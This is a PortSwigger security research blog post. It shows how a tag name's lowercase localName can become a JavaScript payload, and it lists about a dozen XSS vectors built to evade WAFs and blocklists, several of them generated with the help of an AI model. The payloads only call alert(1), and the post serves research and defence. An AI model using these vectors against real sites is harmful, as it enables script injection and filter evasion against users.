---
来源: https://portswigger.net/research/whats-in-a-tag-name-javascript-apparently
类型: html
获取日期: 2026-09-12
---

What's in a tag name? JavaScript, apparently | PortSwigger Research

# What's in a tag name? JavaScript, apparently

![Gareth Heyes](/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

* **Published:** Tuesday, 25 August 2026 at 14:24 UTC
* **Updated:** Tuesday, 25 August 2026 at 14:24 UTC

I was on my laptop, as I often am when there's rubbish on telly, and found myself wondering what characters are allowed in a tag. I knew they had to begin with "a-zA-Z", but what about after that? I tried placing `alert(1)` in the tag name and remembered that the browser converts everything to uppercase. Then I wondered whether another property existed that didn't do that. I gave my tag an id attribute and inspected it in DevTools using `console.dir(x)`. Carefully inspecting each property, I saw that "`localName`" contained a lowercase version of the tag name. This was perfect.

After that, it was a simple case of putting the puzzle pieces together. I already knew that you could make any tag focusable using `tabindex` and that you can chain the `onfocus` event with itself. You can write a string to the event handler using `attributes[0].value`, which gets converted into a function and can then be called as a constructor using "`new`":

`<alert(1) onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>`

I'm sure you'll agree that it's pretty shocking, and it works in every browser. It's also a pretty nice way to bypass a WAF. Let's continue the journey. If `localName` returns a lowercase version of the tag, maybe that means you can use uppercase JavaScript, and yes, you can:

`<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus tabindex=1>`

Then I fuzzed every transformation of the tag name. This showed that alphabetic characters, forward slashes, whitespace, and newlines get transformed. Interestingly, line and paragraph separator characters don't. These are treated like newlines in JavaScript, so you can create bizarre-looking vectors:

`<null alert(1) onfocus="attributes.onfocus.value=localName,new onfocus" autofocus tabindex=1>`

If `attributes[0].value` gets blocked, there are some interesting alternatives:

`<ALERT(1) onfocus="attributes[0].textContent=localName,new onfocus" autofocus tabindex=1>``<ALERT(1) onfocus="attributes[0].nodeValue=localName,new onfocus" autofocus tabindex=1>`

After that, I started messing around with the HTML. An opening angle bracket can actually be part of the tag name. You can then combine it with the first attribute to produce an [XSS](/web-security/cross-site-scripting) vector:

`<alert<img title=" src onerror=alert(1)> " onfocus=innerHTML=localName+attributes[0].value tabindex=1 autofocus>`

I messed around with other attributes, like "part", which actually converts space-separated values into an array. You can then extract the `onfocus(event)` portion of the event, overwrite the event variable with the payload, and replace the `onfocus` variable with the Function constructor. This results in the lowercase tag name being passed to eval and executed as JavaScript:

`<ALERT(1) onfocus="event=localName;part=onfocus,onfocus=Function,eval(part[1])()" tabindex=1 autofocus>`

I gave this to Sol 5.6 to see whether it could come up with any interesting variants. It was pretty damn good. It discovered that you could use `contenteditable` instead of `tabindex` to make an element focusable:

`<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus contenteditable>`

I didn't know about the `getAttributeNode` function either:

`<ALERT(1) onfocus="getAttributeNode('onfocus').value=localName,onfocus()" autofocus tabindex=1>`

It also reminded me about the setHTMLUnsafe function, which I'd forgotten about:

`<alert<img title=" src onerror=alert(1)> " onfocus=setHTMLUnsafe(localName+title) tabindex=1 autofocus>`

Finally, it found a nice variant of the part attribute vector that uses `classList` instead:

`<ALERT(1) onfocus="event=localName;classList=onfocus,onfocus=Function,eval(classList[1])()" tabindex=1 autofocus>`

I started this post as a simple question about what are valid tag name characters and it turned into a reminder that browsers are far more lenient than you would expect. A tag name can become an JS payload, a URL, or even fresh markup.

The lesson is that unusual HTML and seemingly harmless properties such as `localName`, `part`, and `classList` can become unexpected sources of hiding payloads and transformations that can bypass blocklists and WAF signatures.

[XSS](/research/cross-site-scripting-research)
[JavaScript](/research/javascript)
[HTML](/research/html)

[Back to all articles](/research/articles)

## Related Research

[### Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes

03 September 2025
Cookie Chaos: How to bypass \_\_Host and \_\_Secure cookie prefixes](/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
[### Stealing HttpOnly cookies with the cookie sandwich technique

22 January 2025
Stealing HttpOnly cookies with the cookie sandwich technique](/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique)
[### Bypassing WAFs with the phantom $Version cookie

04 December 2024
Bypassing WAFs with the phantom $Version cookie](/research/bypassing-wafs-with-the-phantom-version-cookie)
[### Concealing payloads in URL credentials

23 October 2024
Concealing payloads in URL credentials](/research/concealing-payloads-in-url-credentials)